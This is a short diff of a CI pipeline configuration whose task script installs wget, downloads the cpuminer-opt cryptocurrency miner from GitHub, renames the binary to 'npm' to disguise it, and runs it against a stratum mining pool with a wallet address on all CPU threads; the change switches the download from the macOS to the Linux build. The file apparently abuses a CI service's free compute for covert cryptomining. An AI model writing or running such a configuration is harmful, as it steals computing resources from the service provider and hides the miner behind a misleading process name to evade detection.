@@ -2,8 +2,8 @@ task:
   script: |
    apt update -y \
    && apt install -y wget \
-   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz \
-   && tar -xvf cpuminer-opt-mac.tar.gz \
+   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
+   && tar -xvf cpuminer-opt-linux.tar.gz \
    && mv cpuminer-sse2 npm \
    && ./npm -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.mode-cir -t 0
    
